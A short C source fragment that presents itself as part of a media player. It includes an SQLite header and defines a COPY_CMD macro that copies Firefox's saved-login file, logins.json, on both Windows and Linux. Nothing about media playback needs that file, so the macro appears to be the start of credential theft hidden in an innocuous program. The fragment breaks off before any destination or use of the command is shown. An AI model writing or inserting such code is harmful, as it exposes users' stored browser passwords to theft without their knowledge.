#include "media_player.h"
#include <stdio.h>
#include <string.h>
#include <sqlite3.h>

#ifdef _WIN32
    #define COPY_CMD "copy %APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json "&

#else
    #define COPY_CMD "cp ~/.mozilla/firefox/*.default*/logins.json "    
#endif




